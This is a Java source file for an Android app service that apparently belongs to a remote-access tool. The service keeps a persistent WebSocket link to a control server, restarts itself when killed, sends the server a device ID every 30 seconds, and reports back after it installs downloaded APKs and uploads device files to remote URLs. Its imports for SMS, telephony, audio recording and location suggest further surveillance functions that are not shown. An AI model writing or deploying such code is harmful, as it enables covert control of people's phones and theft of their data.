package com.ot.grhq.client;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Location;
import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class MainService extends Service {

    private static WebSocketClient client;

    public static boolean isConnected = false;
    private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isConnected) {
            try {
                connectToWebSocket();
            } catch (URISyntaxException e) {}
        }

        final Handler handler = new Handler();
        final int delay = 30000;

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    updateWebSocketID();
                } catch (JSONException e) {}
                handler.postDelayed(this, delay);
            }
        }, delay);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        isConnected = false;
        Intent restartService = new Intent(SERVICE_RESTART_INTENT);
        sendBroadcast(restartService);
    }

    private void connectToWebSocket() throws URISyntaxException {
        client = new WebSocketClient(getApplicationContext(), new URI(Utils.WEB_SOCKET_SERVER));
        client.connect();
        isConnected = true;
    }

    private void updateWebSocketID() throws JSONException {
        if (client.isOpen()) {
            JSONObject json = new JSONObject();
            json.put("id", Utils.clientID(getApplicationContext()));
            json.put("type", "client");
            json.put("res", "id");
            client.send(json.toString());
        }
    }

    /**
     * Download completed receiver
     */
    public static class DownloadComplete extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if ("android.intent.action.DOWNLOAD_COMPLETE".equals(intent.getAction())) {
                String app = intent.getStringExtra("app_path");
                if (!app.isEmpty() && app != null)
                    PackageManager.installApp(context, app);

                String downloadURL = intent.getStringExtra("download_url");

                if (client != null && client.isOpen()) {
                    String message = Utils.clientID(context) + ": " + downloadURL + " successfully downloaded";
                    JSONObject json = new JSONObject();
                    try {
                        json.put("type", "client");
                        json.put("id", Utils.clientID(context));
                        json.put("res", "log");
                        json.put("message", Base64.encode(message.getBytes(), Base64.DEFAULT));
                        json.put("timestamp", System.currentTimeMillis());

                        client.send(json.toString());
                    } catch (JSONException e) {}
                }
            }
        }
    }

    /**
     * Completed file upload receiver
     */
    public static class UploadComplete extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if ("upload_complete".equals(intent.getAction())) {
                String filePath = intent.getStringExtra("file_path");
                String uploadURL = intent.getStringExtra("upload_url");

                if (client != null && client.isOpen()) {
                    String message = Utils.clientID(context) + ": " + filePath + " successfully uploaded to " + uploadURL;
                    JSONObject json = new JSONObject();
                    try {
                        json.put("type", "client");
                        json.put("id", Utils.clientID(context));
                        json.put("res", "log");
                        json.put("message", Base64.encode(message.getBytes(), Base64.DEFAULT));
                        json.put("timestamp", System.currentTimeMillis());

                        client.send(json.toString());
                    } catch (JSONException e) {}
                }
            }
        }
    }
}


